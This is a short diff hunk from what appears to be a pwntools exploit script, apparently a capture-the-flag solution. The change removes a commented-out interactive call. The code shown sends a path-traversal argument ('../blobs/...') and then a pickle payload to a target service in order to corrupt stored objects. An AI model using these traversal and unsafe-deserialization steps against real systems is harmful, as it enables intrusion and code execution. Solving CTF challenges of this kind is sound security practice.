@@ -68,9 +68,6 @@ def win(io):
              'payload:')
     log.info(pickle_payload)
 
-    # XXX
-    # io.interactive()
-
     corrupted_path = f'../blobs/{predicted_blobs_file}'
     io.sendlineafter('> ', f'store_object {corrupted_path} [1,2,3]'.encode())
     io.sendlineafter('> ', f'store_bytes dummy {pickle_payload}'.encode())
